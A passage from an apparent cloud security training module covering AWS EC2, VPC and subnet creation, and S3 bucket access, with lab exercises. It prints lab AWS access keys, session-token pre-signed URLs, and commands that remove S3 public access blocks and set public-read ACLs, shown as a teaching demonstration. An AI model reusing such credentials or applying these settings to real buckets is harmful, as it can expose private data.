kali@kali:~$ ssh -i mykeypair.pem ec2-user@18.207.244.209
   ,     #_
   ~\_  ####_        Amazon Linux 2022
  ~~  \_#####\       Preview
  ~~     \###|
  ~~       \#/ ___   https://aws.amazon.com/linux/amazon-linux-2022
   ~~       V~' '->
    ~~~         /
     ~~._.   _/
        _/ _/
       _/m/'
[ec2-user@ip-172-31-58-61 ~]$
```

> Listing 27 - Connecting via SSH to the EC2 Instance

Excellent! We deployed an EC2 instance in the AWS cloud without using the Management Console. We also learned some security aspects to keep in mind when running pentesting assessments against this service.

#### Labs

1. Search for an AMI named "ec2-lab-shared-ami" shared by AWS account 812696600359. Once found, proceed to launch a t2.nano EC2 instance using the shared AMI. Ensure that you mark this exercise as completed before moving on to the next task.

Answer

2. Continue with this exercise once the prior tasks have been marked as complete. Given the following EC2 instance types:

- t2.micro
- t4g.nano
- t3.nano
- t2.nano

Launch an ec2 instance with one of the instance-type from above that fulfill the next requirements:

- 2 vCPUs
- 0.5 GiB RAM
- x86_64 CPU Architecture
- Nitro Hypervisor

Use the same shared AMI from exercise one to launch the instance.

Answer

3. Continue with this exercise once the prior tasks have been marked as complete. Search for the EC2 instance with the name 'webserver_chall' that was created for this challenge and ensure it's currently in the 'running' state. Add a rule in the security group associated with this instance to permit inbound access to ports UDP/1337 and TCP/4242 from any IPv4.

Answer

## 6.3.5. Accessing the Networking Services Lab

We will use an AWS account and the AWS CLI to follow along with the commands and activities in the next section. We can review the _Accesing the AWS lab_ section at the beginning of this Module for instructions on installing the AWS CLI in a Kali virtual machine.

We will mostly use the AWS CLI to interact with our AWS infrastructure, although it is encouraged to also check the corresponding actions and results in the Management Console as an extra mile activity.

Credentials for accessing the AWS Management Console and access keys for programmatical interaction are provided when starting the lab and will be temporarily valid for a few hours. After that, we'll need to start the lab again to retrieve new credentials.

To follow along with the content in the next section, we need to configure the AWS CLI to use the newly-retrieved credentials. We'll run the **aws configure** command, entering the _Access Key ID_ and the _Secret Access Key_. We will be working in _Region_ **us-east-1** throughout this module, so let's set the _Default region name_ to that value, too. The last parameter we can leave blank; it will default to _json_.

To validate that the credentials are working correctly, we can use **aws sts get-caller-identity**, which will only return a valid response if we are using valid credentials.

```kali-shell
kali@kali:~$ aws configure
AWS Access Key ID [None]: AKIAQOMAIGYUQOXBV3HR
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:

kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/learner"
}
```

> Listing 4 - Configuring AWS CLI and validate user.

For now, we'll simply start the lab to retrieve credentials and validate that we can interact with the AWS API via the Management Console and CLI.

## 6.3.6. Networking

In a cloud environment, the provider owns and manages the physical network connections, network devices, on-site security, and any other aspects of networking infrastructure. Customers receive a logical abstraction of a network, leaving us to manage several aspects of networking for the cloud resources we deploy.

AWS [_Virtual Private Cloud_](https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html) (VPC) is the service that we use to interconnect all of our resources for internal and external network access. In essence, a VPC is a virtual network comprised of several parts that resembles an on-premise network.

When we create an AWS account, a default VPC is already created for every AWS Region. When deploying resources with default configurations, several components of a VPC are also automatically created for us. This is so we can have a quick deployment and an easier user experience from the beginning of using AWS. However, once we acquire more knowledge of the AWS environment, it's good practice to plan and create the network according to a secure architecture design.

We can create several VPCs per AWS Region. Each VPC handles a range of IPv4 and IPv6 addresses that we specify using [_Classless Inter-Domain Routing_](https://aws.amazon.com/what-is/cidr/) (CIDR) notation, for example, 172.16.0.0/16. From this range, we can then create additional CIDR blocks of subnets such 172.16.0.0/20 (subnet1) and 172.16.32.0/20 (subnet2). Each subnet resides in a single Availability Zone. Because VPCs are isolated virtual networks, different VPCs can even have the same CIDR block.

In this lab, we removed the default VPC and subnet, so we will create a custom VPC.

First, let's create the VPC using **aws ec2 create-vpc**. Besides the AWS Region, the only required parameter is **--cidr-block**, which defines (in CIDR notation) the size of the IP address that the VPC will hold. We'll define 172.16.0.0/20. If the command ran successfully, we will recieve a JSON response with details about the new VPC. We can use **aws ec2 describe-vpcs --region us-east-1** at any time to list all VPCs available in the specified AWS Region. We will need the value of _VpcId_ later to create subnets.

```kali-shell
kali@kali:~$ aws ec2 create-vpc --cidr-block 172.16.0.0/20 --region us-east-1
{
    "Vpc": {
        "CidrBlock": "172.16.0.0/20",
        "DhcpOptionsId": "dopt-0f5790473c39adfc5",
        "State": "pending",
        "VpcId": "vpc-0dcde63d07b060381",
        "OwnerId": "123456789012",
        "InstanceTenancy": "default",
        "Ipv6CidrBlockAssociationSet": [],
        "CidrBlockAssociationSet": [
            {
                "AssociationId": "vpc-cidr-assoc-0912139b9b8e41cdd",
                "CidrBlock": "172.16.0.0/20",
                "CidrBlockState": {
                    "State": "associated"
                }
            }
        ],
        "IsDefault": false
    }
}

kali@kali:~$ aws ec2 describe-vpcs --region us-east-1
{
    "Vpcs": [
        {
            "CidrBlock": "172.16.0.0/20",
...
```

> Listing 28 - Creating a Custom VPC

Next, we can use the **aws ec2 create-subnet** command to create two subnets inside the VPC. With the **--vpc-id vpc-0dcde63d07b060381** argument, we'll specify the ID of the VPC. The **--cidr-block** option specifies the size of the network in CIDR notation, and with the **--availability-zone** option, we specify the name of the Availability Zone where the subnet will reside. Best practices recommend having subnets in different AZs to improve high availability of our cloud architecture.

```kali-shell
kali@kali:~$ aws ec2 create-subnet --vpc-id vpc-0dcde63d07b060381 --cidr-block 172.16.0.0/22 --availability-zone us-east-1a
{
    "Subnet": {
        "AvailabilityZone": "us-east-1a",
        "AvailabilityZoneId": "use1-az1",
        "AvailableIpAddressCount": 1019,
        "CidrBlock": "172.16.0.0/22",
...

kali@kali:~$ aws ec2 create-subnet --vpc-id vpc-0dcde63d07b060381 --cidr-block 172.16.4.0/22 --availability-zone us-east-1b
{
    "Subnet": {
        "AvailabilityZone": "us-east-1b",
        "AvailabilityZoneId": "use1-az2",
        "AvailableIpAddressCount": 1019,
        "CidrBlock": "172.16.4.0/22",
...
        }
    }
}

```

> Listing 29 - Creating Subnets

We can list all of the subnets available in the _us-east-1_ Region with the **aws ec2 describe-subnet --region us-east-1** command. We can also go to the AWS Management Console, locate the _search bar_ in the top menu, and type **VPC** to navigate to the _VPC service_. Then, in the _VPC service_ menu, we can list the available VPCs and subnets. We need to make sure that we are located in the _us-east-1_ Region to list the resources we've just created.

![[OffSec/Cloud/Cloud Essentials/z. images/9fb3c30d2fb52a395152b0e099fee5cc_MD5.jpg]]

Figure 12: Listing Subnets in Management Console

When we deploy resources that interact with VPCs, like an EC2 instance, we need to specify the subnet to which that resource will be connected. Internally, AWS creates a virtual network interface to that resource and assigns the IP address of the subnet CIDR. If we don't specify a subnet, AWS will pick a subnet from the default VPC of the Region.

To allow the subnets to communicate with external networks, we can create a VPC component called a _Gateway_. There are several types of gateways.

An [_Internet Gateway_](https://docs.aws.amazon.com/vpc/latest/userguide/VPC_Internet_Gateway.html) allows communication between a resource inside the VPC and the internet. It assigns a public IP address to a resource so that resources on the internet can also initiate a connection to the resources inside the VPC. If we only need resources inside the VPC to connect to the internet, but not the other way around, we can use [_NAT Gateways_](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-nat-gateway.html).

[_AWS Direct Connect_](https://docs.aws.amazon.com/directconnect/latest/UserGuide/Welcome.html) provides a dedicated link from on-premises networks and the AWS environment. The data link is managed by AWS through a partner provider. However, this option is not available for all countries and Regions. We can still create direct connections with on-premises networks through a VPN connection using a _Transit Gateway_.

Resources inside different VPCs are completely isolated from each other. We can, however, connect them using a [_VPC peering_](https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html) connection that enables a dedicated internal link between VPCs. We can also use Transit Gateways for this purpose, although, depending on the use case, one option may be more suitable in terms of features and pricing.

There are also VPC components related to secure network access to resources and subnets.

Security groups are a set of rules we can create and attach to a resource, like an EC2 instance, to specify inbound and outbound traffic for that resource. For example, we can create a security group named "ssh access" with a rule that permits inbound SSH connections from a specific IP address on the internet, then attach this security group to any EC2 instance we need to manage from outside.

At the subnet level, we can create network _access control lists_ (ACLs), which are rules to control network access between subnets inside a VPC.

There are other security services that aren't inner components of a VPC, but they interact with it to provide an extra layer of perimeter security. [_AWS Shield_](https://docs.aws.amazon.com/waf/latest/developerguide/shield-chapter.html) protects against _distributed denial of service_ (DDoS) attacks. [_AWS WAF_](https://docs.aws.amazon.com/waf/latest/developerguide/waf-chapter.html) protects from common web application exploits. [_AWS Network Firewall_](https://docs.aws.amazon.com/network-firewall/latest/developerguide/what-is-aws-network-firewall.html) provides extra security features to check traffic across the VPC.

We've now explored some of the network components we can manage inside a VPC. Each component holds other features and configurations that we need to understand when architecting our cloud networking. We also need to keep in mind that, as a provider, one of AWS's intentions is to help customers get their services up and running quickly, without too much complexity in configuration, to make the learning curve of using AWS easier. Sometimes the default configuration might be too open, so as with any other AWS service, we need to understand the security and best practice section of the documentation.

#### Labs

1. Create a VPC with an address space of 65536 IPv4 addresses that go from 192.168.0.0 to 192.168.255.255. Ensure this exercise is marked as completed before proceeding with the next one.

Answer

2. Continue with this exercise once the prior tasks have been marked as complete. Create four subnets within the VPC, ensuring that all available IPv4 addresses are distributed equally among them. The subnet that starts with the IP address 192.168.0.0 should be in the us-east-1a availability zone. The subsequent subnets should be in the us-east-1b, us-east-1c, and us-east-1d availability zones, ordered by subnet address from the lowest to the highest.

Answer

3. Continue with this exercise once the prior tasks have been marked as complete. Create an EC2 instance inside the previously created subnet in the _us-east-1a_ availability zone. The instance also must fulfill the following specifications:

```
Instance type: t2.nano
AMI: ami-0aff157d2e25f7fbc
```

Answer

## 6.3.7. Accessing the Storage Services Lab

We will use an AWS account and the AWS CLI to follow along with the commands and activities of the next section. We can review the _Accessing the Lab_ section at the beginning of this Module for instructions on installing the AWS CLI in a Kali virtual machine.

We will mostly use the AWS CLI to interact with our AWS infrastructure, although it is encouraged to also check the corresponding actions and results in the Management Console as an extra mile activity.

Credentials for accessing the AWS Management Console and access keys for programmatical interaction are provided when starting the lab and they will be temporarily valid for a few hours. After that, we'll need to start the lab again to retrieve new credentials.

To follow along with the content in the next section, we need to configure the AWS CLI to use the newly-retrieved credentials. We can run the **aws configure** command and enter the _Access Key ID_ and the _Secret Access Key_. We will be working in _Region_ **us-east-1** throughout this module, so let's set the _Default region name_ to that value, too. The last parameter we can leave blank, as it will default to _json_.

To validate that the credentials are working correctly, we can use the **aws sts get-caller-identity**, which will only return a valid response if we are using valid credentials.

```kali-shell
kali@kali:~$ aws configure
AWS Access Key ID [None]: AKIAQOMAIGYUQOXBV3HR
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:

kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/learner"
}
```

> Listing 4 - Configuring AWS CLI and validate user.

For now, we'll simply start the lab to retrieve credentials and validate that we can interact with AWS API via the Management Console and CLI.

## 6.3.8. Storage

Storing data is another important need for many organizations. To ensure that critical information is secure enough to resist any kind of failure that can occur with storage servers, organizations need to design and invest in _fault-tolerant_ and _highly available_ solutions. There are several aspects to consider when designing and implementing storage architecture. We normally end up paying for the disk space we use, as well as for disk space needed for backup and contingency of the data. It is also necessary to invest in future usage of the storage, so we don't run out of space in a short time.

Cloud storage is more cost-efficient compared to on-premises solutions and the demand for these services keeps growing over time. In fact, the first service available in AWS was [Simple Storage Service]https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html (S3).

S3 is known as _object storage_. An object is any kind of file, like a picture, video, disk image, text file, etc. We can interact with S3 to upload and download objects. From the customer's point of view, the disk space is unlimited, meaning we no longer need to invest in disk space we don't use.

To start using S3, we first need to create a _bucket_. A bucket is a container for storing objects. At the bucket level, we can enable and manage some features like encryption, access management, versioning, policies, etc.

Buckets are global resources in AWS. This means that each bucket name must be unique across all AWS accounts in all the AWS Regions. After the bucket is created, another account cannot use the same name until the bucket is deleted. To avoid receiving "bucket name not available" errors, we will add some randomness to the bucket name. The final name will be **offsec-$RANDOM-$RANDOM-$RANDOM-mybucket**.

Notice that we use the shell variable _$RANDOM_, which will return a random number between _0 and 32767_. For our introductory lab, this amount of randomness is enough to avoid collisions, which is the event that other account in the Region uses the same name. For real-life implementations, we might want to use a more robust strategy such as [_UUIDv4_](https://commons.apache.org/sandbox/commons-id/uuid.html), which is a standardized collision-resistant format for generating unique identifiers, especially if we are creating buckets programmatically.

To interact with the S3 service, we can use **aws s3** and **aws s3api** commands. Some actions can be done by both of them, but in general terms, **s3api** provides direct access to the S3 API to perform more advanced and specialized tasks, while **s3** provides an abstraction layer of commands to make it easier to perform common tasks such as creating and deleting buckets, listing, uploading, downloading, and deleting objects, etc.

In this lab, we'll interact with the S3 services by performing common tasks, so we'll use the **s3** command. The subcommands available resemble the Unix-like alternatives. The following table lists some examples.

|S3 Sub-command|Description|
|---|---|
|mb|Create Bucket|
|ls|List object in a bucket|
|cp|Copy object|
|mv|Move object|
|rm|Remove object|

> Table 3 - List of AWS S3 Subcommands

We might notice that the subcommands resemble the Unix-like commands for performing the same actions, making it easier to interact with buckets like we were interacting with a Unix-based filesystem.

We are now ready to create buckets and objects.

We'll create the bucket using the **aws S3 mb s3://offsec-RANDOMRANDOMRANDOM-$RANDOM-mybucket** command. We write the bucket name in a special syntax known as [_S3Uri_](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/index.html), which resembles an HTTP URI. If the bucket is created successfully, we'll receive a response with the bucket name.

```kali-shell
kali@kali:~$ aws s3 mb s3://offsec-$RANDOM-$RANDOM-$RANDOM-mybucket
make_bucket: offsec-14480-20662-24324-mybucket
```

> Listing 30 - Creating a S3 Bucket

Next, we can create a text file with any data and upload it to our bucket. The **aws s3 cp <origin> <destination>** command copies a local file or S3 object to another location locally or in S3.

```kali-shell
kali@kali:~$ echo "some data" > offsec.txt

kali@kali:~$ aws s3 cp ./offsec.txt s3://offsec-14480-20662-24324-mybucket
upload: ./offsec.txt to s3://offsec-14480-20662-24324-mybucket/offsec.txt

```

> Listing 31 - Uploading a Local File to a S3 Bucket

We can list the content of a bucket with the **aws s3 ls <S3Uri>** command. We need to specify the **S3Uri** of the bucket name we want to list as an argument.

```kali-shell
kali@kali:~$ aws s3 ls s3://offsec-14480-20662-24324-mybucket
2022-12-05 21:51:40         10 offsec.txt
```

> Listing 32 - Listing the Content of a S3 Bucket

Excellent! We can validate that the file was successfully uploaded to our bucket in the AWS cloud.

When working with S3, we probably will need to grant other AWS accounts, internet users, or even applications to have access to those objects. We can retrieve objects interacting with the AWS API just as we have been doing so far. There is also, however, a way to retrieve objects directly from the browser through a web request. We just need to convert our bucket and the object we want to retrieve in a URL style and send an HTTP GET request. There are two URL styles we can use and both are equally valid.

In the _virtual-hosted-style_ request, the bucket name is part of the domain in the URL. **region-code** is the name of the AWS Region where the bucket exists. **key-name** is the name of the object we want to retrieve.

```html
https://<cr>bucket-name</cr>.s3.<cr>region-code</cr>.amazonaws.com/<cr>key-name</cr>
```

> Listing 33 - Request S3 Object Using URL Format in Virtual Hosted Style

The _path-style_ URL has the following syntax:

```html
https://s3.<cr>region-code</cr>.amazonaws.com/<cr>bucket-name</cr>/<cr>key-name</cr>
```

> Listing 34 - Request S3 Object Using URL Format in Path Style

We can use either of these URL styles. The URLs for the object we created earlier would be:

```html
https://<cr>offsec-14480-20662-24324-mybucket</cr>.s3.<cr>us-east-1</cr>.amazonaws.com/<cr>offsec.txt</cr>
https://s3.<cr>us-east-1</cr>.amazonaws.com/<cr>offsec-14480-20662-24324-mybucket</cr>/<cr>offsec.txt</cr>
```

> Listing 35 - Request offsec.txt S3 Object Using Both URL Styles

While we can generate a URL for any bucket and object, objects are private by default. This means that they are only accessible to users with the appropriate permissions. As a result, we will get an _Access Denied_ response when trying to access the object publicly.

![[OffSec/Cloud/Cloud Essentials/z. images/e954c00e6d7087f9627d48d6daa95faf_MD5.jpg]]

Figure 13: Access Denied when Retrieving an S3 Object

This default setting helps to ensure the security and privacy of S3 objects. Users can change the access permissions for an S3 object, such as making it public or sharing it with other users or AWS accounts, but this must be done explicitly.

One way of granting access to an object is by generating a [_pre-signed URL_](https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html). This allows anyone who receives the pre-signed URL to retrieve the S3 object with an HTTP GET request.

The **aws s3 presign s3://offsec-14480-20662-24324-mybucket/offsec.txt** command generates a pre-signed URL for the object in our bucket specified as an argument in _S3Uri_ format.

By default, the pre-signed URL expires in 1 hour. The **--expires-in 600** option changes the default value to 600 seconds (10 minutes). The maximum value that we can set is 604800 seconds (one week).

```kali-shell
kali@kali:~$ aws s3 presign s3://offsec-14480-20662-24324-mybucket/offsec.txt --expires-in 600
https://offsec-14480-20662-24324-mybucket.s3.us-east-1.amazonaws.com/offsec.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQOMAIGYU67YTNMF5%2F20221206%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20221206T204653Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQC5QMawx3ySIxu%2FMAvnVpojd6r7FIbe4l1rpl99C2fBPgIhAKhIfkxLo8zaljyMXC3cai4H2l75Nlg%2B7wRuKRq6omKVKqcDCBkQABoMMDMwODcwNjE1NTkzIgwmXYrYPyTCv00M%2BAkqhAOjctRSPuFzgFX%2Bleqi9cMlRB%2FNX5LZhEKnd57vlnuM5BPAlD7azeTNh6rI9%2BgtqZvSJcUweVwLzRjzL%2FEm7%2FVNHS89BETFXa5WocGJ5GXpE%2FYnM50gEpF7f%2F74OUE%2F86v6%2B2PfVAqRAbGzZQAB%2BfZrOw1QHRAcpp1OnQfnndD0ynKYcO8rm4%2B55s858HeC6K0zpoGPUY2%2BN%2FZwUmWcoP8vDuasdy5jKkAoY72qCZtbKJWLUP0qchwj%2BkuvCOolCtBBaWYhNqjebWeMPXcIEBEM4p%2Bk03whhmyGIDHvqeLymfIes%2BVT4Pit%2BgJdqdyvEzxIqhXqGOIGBheN6C89o3A4WtwQX0zl%2FgBZdR8vw86OpvM4%2FLDRfodJqRsEc0ygxcvBfvMQXUE8ixKl55OAMX%2BAGSE6hXD6EyVav2atGF6GI3ldbJmuJhx1GbRk5lJBugRqdZ0ixtltAm8kgQ7gy%2FLQniS8gzLUhkVGTdJ5j64z1993RGp%2FqnJ08fqYMfqxAXBA1KL%2BMO7NvZwGOqUB7zcbm%2BH%2F6gD60R61qLv7iMSOwj%2Fmw71v%2Bn9KXGUPLXywcLQnhijXLJ2Ro0XwpMfVh0J7jf%2BEY%2FADKobvV8M3lqXb03zXTwQ8a8Q1deEbxnvmGkxTMK4%2BMVZu7yzR5%2B1OEd8tx9aA9hNeSzqrocYf%2FTSeWsgsaSETVNGgXNmNaupxWZj5xb908G9WYp%2FspyV12YiaCWEmAklhCb%2BdXEli4HJ%2BLTql&X-Amz-Signature=8fc979947efbef42ca9f784a31f0a52448d2f453c9268e4689e1236e1d247575
```

> Listing 36 - Generating an S3 Pre-signed URL for offsec.txt Object

Let's use **curl** to retrieve the object from the CLI both with the pre-signed URL and with the normal URL to determine if it works as expected.

```kali-shell
kali@kali:~$ curl "https://offsec-14480-20662-24324-mybucket.s3.us-east-1.amazonaws.com/offsec.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQOMAIGYUTF7UVWWY%2F20230210%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230210T170137Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMSJHMEUCIQCEzpu4P%2FUT2%2B66S%2F%2Bc453cFjm60qiAORqSlk%2F0NA7yIAIgHnZfrKHbrGQy6%2FxGPYrSrRXsLwf9mvLoUA5Ik%2BlmCt8qsAMIqv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgwwMzA4NzA2MTU1OTMiDCe4bDSfrcepb5Cp7yqEAysp7zNapKlQOdMltjxy0LcFX%2Bw04PWR3UAiIuLip3AIG6WJ%2BdzLkcPnUTwERn9tZMTHrzoHsXMmoQOL9ARuuZt7CmBl1JEoT1Cx5%2FJ%2BWh1YG5dve8oRD2NQ51cuZEJ3gw%2BYN6zmaL38DKoniobTPrj7Q%2FaCCupYPqAhc7%2FIOUe0qULzd4MfGL8yInjphYNhH%2Bm%2BsZ0%2FSMYLO9is8VznO%2FMdd5zhdeWdgdfDlk%2BTG8VPwy3jWpPg7V73xK2NsYlxsPT18OWsykOg3E4THE3mbY5L%2F1ZAO6khtx7bTsNLWbPkGL0ykDnp0HH7Mnxm79hHR7TFu2sbPMmSQDDE%2BMoK58Qp6Hsb0OgPWnfVcCq8mzP7rp6FV5Gmarrt3%2Btqbgfk6dIT%2BGxgO%2FOoS0tKlP5qefUD8AaiPilUOwOtMunlRV47%2B3Gxfr4jTSSpN9jgV169LzbEAKt0OA461JJvwKr6E3h%2BwVxZmXoas4X6cgwpTrjFNL1lJFFJsimdq%2F5YsmBD3hlcDCow5e%2BZnwY6pgE00LF4Oe6AMtQ%2FHBONA%2BNa1ztes9763VJZveBWuDbibeO1BXDQzSb%2FhfKCi6ro8PWltIXUVDsiJh3skZoXtpqmShW1haAvlXviBCOvp3KET7RUhwxmEwMj5Ahvxtkkj6qxrjWVNq6uoYSiF3nCLgNTfmcz0y16seWJuoRStnEa5peU437ezCTu0JTNj0flaAxqUv8j%2BDOrDtVNG%2FgreJbBOVQaYAi5&X-Amz-Signature=a6bdae2f1b370cd65979ca3dccf157285ef60d4afa43c2b7cda04d3be63e58d7"
some data

kali@kali:~$ curl https://offsec-14480-20662-24324-mybucket.s3.us-east-1.amazonaws.com/offsec.txt
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>GCM1BG2FZE9CDY05</RequestId><HostId>1Cx/GA4qY/BW9DUImQj4hdlrK5RlJi8mCsrQGigeEWx3MZSGhHK1ckJU4u/rUaSbKVRQ6JRbPwo=</HostId></Error>
```

> Listing 37 - Using Curl to Retrieve offsec.txt Object with its Pre-signed and Normal URLs

We can validate that we have access to the object if we use the pre-signed URL, but we still receive an "Access Denied" response if we try to access the object directly.

Let's assume that the object we want to upload does not contain any sensitive data and needs to be publicly available. In this case, we might opt to grant perpetual public access to the object. The recommended way to do this is by creating a IAM resource-based policy and attaching it to the bucket.

Another way to grant access is by using S3 [_access control lists_](https://docs.aws.amazon.com/AmazonS3/latest/userguide/acls.html) (ACLs). Each bucket and object has an ACL attached to it as a _subresource_. It defines which AWS accounts or groups are granted access and the type of access.

Warning

Since April 2023, S3 automatically blocks public access and disables S3 ACLs for all new buckets in all AWS Regions. This change encourages the usage of policies as a more flexible alternative.

To keep this lab simple, we'll enable ACLs to configure public access to our S3 objects. It's common to still encounter this type of configuration and although it's not unsecure by default, it could lead to over-permissive misconfigurations, so we should know how to identify it.

There are two configurations that enable the usage of ACLs: [_Object Ownership_](https://docs.aws.amazon.com/AmazonS3/latest/userguide/about-object-ownership.html) and [_Public Access Block_](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html#access-control-block-public-access-options). We can check their default configurations set when we created the bucket by running the **aws s3api get-bucket-ownership-controls** and **aws s3api get-public-access-block**. To both commands, we need to also specify the name of the bucket with the **--bucket** argument.

```kali-shell
kali@kali:~$ aws s3api get-bucket-ownership-controls --bucket offsec-14480-20662-24324-mybucket
{
    "OwnershipControls": {
        "Rules": [
            {
                "ObjectOwnership": "BucketOwnerEnforced"
            }
        ]
    }
}

kali@kali:~$ aws s3api get-public-access-block --bucket offsec-14480-20662-24324-mybucket
{
    "PublicAccessBlockConfiguration": {
        "BlockPublicAcls": true,
        "IgnorePublicAcls": true,
        "BlockPublicPolicy": true,
        "RestrictPublicBuckets": true
    }
}
```

> Listing 38 - Getting object ownership and public access configuration of a bucket

The _Object Ownership_ setting controls ownership of objects uploaded to the bucket. By default, it is set to **BucketOwnerEnforced**, which disables ACLs and the bucket owner owns all the objects in the bucket. To enable ACLs, this setting should be set to **ObjectWriter** or **BucketOwnerPreferred**.

The _Public Access Block_ settings manage some extra protections to disable public access, preventing unintended access granted by ACLs or policy misconfigurations. By default, all public access protections are enabled. To grant public access via ACLs, we need to set **BlockPublicAcls** and **IgnorePublicAcls** to false. The other two settings are for permissions via IAM policies.

To enable ACLs in this lab, we are going to delete both the _Object Ownership_ and _Public Access Block_ settings. Doing so, the bucket will default to **ObjectWriter** as the _Object Ownership_, and all the settings in the _Public Access Block_ are set to false.

We can delete both of these settings by running the **aws s3api delete-bucket-ownership-controls** and **aws s3api delete-public-access-block**. For both commands, we also need to specify the name of the bucket with the **--bucket** argument. These commands will not return any output after completing.

```kali-shell
kali@kali:~$ aws s3api delete-bucket-ownership-controls --bucket offsec-14480-20662-24324-mybucket
kali@kali:~$ aws s3api delete-public-access-block --bucket offsec-14480-20662-24324-mybucket
```

> Listing 39 - Deleting object ownership and public access configuration of a bucket

Caution

This is not the recommended way of granting public access to the bucket and objects. It's an example of a common configuration we may encounter, especially because this was a default configuration for a long time.

Now that ACLs are enabled, it doesn't mean that the objects are already publicly accessible. We've just enabled the capacity of granting public access via ACLs. Let's begin by getting the current ACL of the object with the **aws s3api get-object-acl** command. We'll specify the bucket (**--bucket**) and the object (**--key**) arguments.

```kali-shell
kali@kali:~$ aws s3api get-object-acl --bucket offsec-14480-20662-24324-mybucket --key offsec.txt
{
    "Owner": {
        "DisplayName": "lab-admin",
        "ID": "0560a617a6fa9f34ae6f331c9a614a0b98d6500657ec846eb2d96905b32cf42d"
    },
    "Grants": [
        {
            "Grantee": {
                "DisplayName": "lab-admin",
                "ID": "0560a617a6fa9f34ae6f331c9a614a0b98d6500657ec846eb2d96905b32cf42d",
                "Type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
        }
    ]
}
```

> Listing 40 - Listing Default ACL for offsec.txt S3 Object

From the output, we learn that after we create a bucket or an object, Amazon S3 creates a default ACL that grants the resource owner full control over the resource. We'll also notice that S3 uses another identifier for the user, the _canonical user ID_.

Writing ACLs is out of scope for this section. However, S3 supports a set of predefined grants, known as [_canned ACLs_](https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl), that we can use for a quick demonstration.

The **aws s3api put-object-acl** lets us insert an ACL for an object. We need to specify the bucket, the object, and with the **--acl public-read** argument, we grant _read_ access.

Let's check the ACL of the object again and confirm that a new grantee was inserted at the end. We'll also use **curl** to send an HTTP request to get the object from the command line and validate that the content of the **offsec.txt** file is received.

```kali-shell
kali@kali:~$ aws s3api put-object-acl --bucket offsec-14480-20662-24324-mybucket --key offsec.txt --acl public-read

kali@kali:~$ aws s3api get-object-acl --bucket offsec-14480-20662-24324-mybucket --key offsec.txt
{
...
        {
            "Grantee": {
                "Type": "Group",
                "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
            },
            "Permission": "READ"
        }
    ]
}

kali@kali:~$ curl https://offsec-14480-20662-24324-mybucket.s3.us-east-1.amazonaws.com/offsec.txt
some data
```

> Listing 41 - Setting a Canned ACL to Grant Read Access to offsec.txt S3 Object

Similarly, the **aws s3api put-bucket-acl** command lets us configure an ACL for a bucket. The **--key** argument is not needed in these cases.

We'll notice from the previous listing that the new entry uses **URI** instead of **ID** to specify the grantee. This URI identifies an _S3 predefined group_ called _All Users_. Other predefined groups we can set include _AuthenticatedUsers_ and _LogDelivery_.

One important thing to notice about the _AuthenticatedUsers_ group is that it grants access to any AWS authenticated user in the world. Cloud administrators sometimes confuse this concept and end up granting excessive permissions to a bucket.

Warning

Unintended public access to objects and buckets due to misconfiguration of ACLs using the _AuthenticatedUsers_ group has been the cause of many breaches.

When using ACLs, a grantee can be an AWS account, identified by its canonical ID, or one of the predefined Amazon S3 groups, identified by its URI. However, the grantee cannot be an IAM user. To grant access to IAM users, we need to configure IAM policies. We can also set up S3 bucket policies, which are resource policies we define at the bucket level.

Let's observe what happens if we also make the bucket publicly accessible. Earlier, we applied an object-ACL to make an object public. Let's use the **curl** command to browse the **offsec.txt** object again, as well as the root path of the bucket.

```kali-shell
kali@kali:~$ curl https://offsec-14480-20662-24324-mybucket.s3.us-east-1.amazonaws.com/offsec.txt
some data

kali@kali:~$ curl https://offsec-14480-20662-24324-mybucket.s3.us-east-1.amazonaws.com/
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied</Message> 
  <RequestId>2RVW98WKP0Z9CD91</RequestId>
...
</Error>
```

> Listing 42 - Access Denied when Trying to List the Content of the Bucket

To allow the bucket to be publicly listable using ACLs, we'll use **s3api put-bucket-acl --acl public-read**. We also need to specify the bucket name with the **--bucket** argument.

Similar to **get-object-acl**, we can use **get-bucket-acl** to list the ACLs of the bucket specified with the **--bucket** argument.

```kali-shell
kali@kali:~$ aws s3api put-bucket-acl --acl public-read --bucket offsec-14480-20662-24324-mybucket

kali@kali:~$ aws s3api get-bucket-acl --bucket offsec-14480-20662-24324-mybucket
{
    "Owner": {
        "DisplayName": "f.ortiz+cloud",
        "ID": "0560a617a6fa9f34ae6f331c9a614a0b98d6500657ec846eb2d96905b32cf42d"
    },
    "Grants": [
...
        {
            "Grantee": {
                "Type": "Group",
                "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
            },
            "Permission": "READ"
        }
    ]
}
```

